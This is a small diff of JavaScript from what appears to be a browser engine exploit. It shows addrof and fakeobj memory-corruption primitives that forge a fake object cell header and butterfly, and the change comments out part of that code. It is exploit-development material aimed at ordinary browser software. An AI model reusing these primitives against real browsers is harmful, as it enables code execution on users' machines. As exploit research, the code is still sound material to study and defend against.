@@ -485,10 +485,12 @@ var VM_PROT_EXECUTE = 0x4
               a1[offset] = new Int64(addr).asDouble();
               return b1[0];
             }
+            /*hope we dont crash or have a gc from here on out...
             let obj = {
               jsCellHeader: bigint2float(unboxDouble(doubleArrayCellHeader)),
               fakeButterfly: a0
             };
+            
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString());
             port.postMessage(typeof(addr) +"vs"+typeof(new Int64("0x10")))
@@ -518,6 +520,7 @@ var VM_PROT_EXECUTE = 0x4
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
             }
+            */
             port.postMessage("We got stableish addrof and fakeobj");
             
           }
